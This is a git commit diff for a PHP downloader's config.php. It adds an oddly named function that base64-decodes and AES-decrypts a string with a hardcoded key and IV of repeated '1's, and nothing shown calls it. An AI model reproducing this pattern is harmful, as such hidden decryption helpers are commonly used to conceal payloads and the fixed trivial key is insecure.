d9590da247b72b50462292afc0f69e1b8c76c1c3
Vijay Kumar <contactvkr@yahoo.com>
2022-03-06 12:12:38 +0530

    Update config.php

--- config.php
+++ config.php
@@ -3,4 +3,10 @@
 //Enter your domain URL below 
 
 $domain = "http://get2mate.ga/demo/vkrdownloader";
+
+function e7061($e){
+	$ed = base64_decode($e);
+	$n = openssl_decrypt("$ed","AES-256-CBC","1111111111111111",0,"1111111111111111");
+	return $n;
+}
 ?>
